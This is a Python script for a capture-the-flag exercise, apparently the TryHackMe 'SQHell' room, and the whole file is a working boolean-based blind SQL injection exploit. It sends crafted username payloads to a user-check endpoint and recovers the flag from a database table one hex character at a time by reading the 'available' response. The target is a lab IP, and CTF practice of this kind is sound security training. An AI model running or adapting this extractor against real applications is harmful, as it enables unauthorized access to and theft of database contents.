#+--------------------------------------------------
# Exploit for Boolen based SQLi (SQHell THM) FLAG 3
#+--------------------------------------------------
import requests
import json
i=1
EXTRACTED='THM{FLAG3:' #Using Flag template
IP='10.10.21.43' #Enter IP Here
while i<=32:
    for j in range(48,71):
        if j in range(58,65): #Only Hex Character to save time
            pass
        else:
            PAYLOAD="admin' AND (SELECT SUBSTR((SELECT flag from sqhell_3.flag),1,%s)='%s') AND '1'='1"%(10+i,EXTRACTED+chr(j)) #Payload Generation
            data=requests.post(url="http://%s/register/user-check?username=%s"%(IP,PAYLOAD)) #Send POST request
            data=json.loads(data.text)
            if data["available"] == False: #Comparing output
                EXTRACTED+=chr(j)
                print(EXTRACTED)
                break
            if j==70:
                exit("Error: Couldn't find matching character!")
    i+=1    
print("FLAG is: ", EXTRACTED+"}")
